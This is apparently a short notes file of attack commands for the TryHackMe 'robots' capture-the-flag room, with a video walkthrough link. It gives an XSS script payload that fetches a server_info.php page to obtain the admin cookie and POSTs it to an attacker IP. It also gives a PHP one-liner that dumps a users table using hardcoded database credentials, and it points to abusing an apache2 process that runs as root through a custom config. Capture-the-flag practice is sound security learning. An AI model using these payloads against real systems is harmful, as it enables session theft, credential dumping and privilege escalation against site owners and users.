command used on TryHackMe robots room (https://tryhackme.com/room/robots)

video walk through:

https://youtu.be/ZAylF3vSzzQ

XSS payload using post request to get admin cookie by sending server_info.php file

<script>fetch('http://robots.thm/harm/to/self/server_info.php').then(r=>r.text()).then(t=>fetch('http://10.10.74.83:8000/catch',{method:'POST',body:t}))</script>

php one line command to query users table:

php -r '$pdo=new PDO("mysql:host=db;dbname=web;charset=utf8mb4","robots","q4qCz1OflKvKwK4S",[PDO::ATTR_ERRMODE=>PDO::ERRMODE_EXCEPTION,PDO::ATTR_DEFAULT_FETCH_MODE=>PDO::FETCH_ASSOC]);$r=$pdo->query("SELECT * FROM users");while($row=$r->fetch()){print_r($row);}'

As apache2 is running as root, you can create custome config:

thm.conf see repo.
